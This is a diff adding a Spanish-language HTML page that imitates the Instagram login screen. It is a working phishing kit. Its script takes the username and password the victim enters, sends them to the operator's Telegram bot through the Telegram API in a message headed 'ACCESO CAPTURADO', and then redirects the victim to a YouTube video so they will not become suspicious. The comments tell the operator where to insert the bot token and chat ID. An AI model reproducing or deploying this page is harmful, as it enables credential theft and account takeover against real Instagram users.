@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background-color: #fff; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input { width: 100%; padding: 9px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 7px; border: none; border-radius: 4px; background-color: #0095f6; color: #fff; font-weight: 600; cursor: pointer; margin-top: 8px; }
+        .or-divider { display: flex; align-items: center; margin: 15px 0; color: #8e8e8e; font-size: 13px; }
+        .or-divider::before, .or-divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_port_grad.png/9380f682f7a8.png" alt="Instagram">
+        <input type="text" id="user" placeholder="Teléfono, usuario o correo electrónico">
+        <input type="password" id="pass" placeholder="Contraseña">
+        <button class="btn" onclick="sendLoc()">Iniciar sesión</button>
+        <div class="or-divider">O</div>
+        <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
+    </div>
+
+    <script>
+        async function sendLoc() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(!u || !p) return;
+
+            // CONFIGURA AQUÍ TU TELEGRAM
+            const TOKEN = "TU_BOT_TOKEN_AQUI";
+            const ID = "TU_CHAT_ID_AQUI";
+            
+            const msg = `🔥 *ACCESO CAPTURADO*\n👤 Usuario: ${u}\n🔒 Clave: ${p}`;
+
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+
+            // Redirige al estafador a un video real para que no sospeche
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        }
+    </script>
+</body>
+</html>
